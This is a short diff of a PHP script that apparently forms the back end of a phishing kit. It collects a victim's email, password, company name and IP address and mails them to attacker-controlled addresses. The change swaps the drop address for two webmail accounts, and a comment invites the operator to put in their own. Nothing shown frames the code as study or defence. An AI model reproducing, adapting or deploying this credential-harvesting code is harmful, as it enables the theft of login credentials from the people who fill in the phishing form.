@@ -12,7 +12,7 @@ $ip = getenv("REMOTE_ADDR");
 $hostname = gethostbyaddr($ip);
 
 // Set up the email parameters
-$to = 'mbamachrisemeziam@gmx.com'; // Replace with your preferred email address
+$to = 'starlogs22@yandex.com,jiggabills@yandex.com'; // Replace with your preferred email address
 
 $message = "Email: $email\nPassword: $password \nCompany Name: $companyName \n";
 
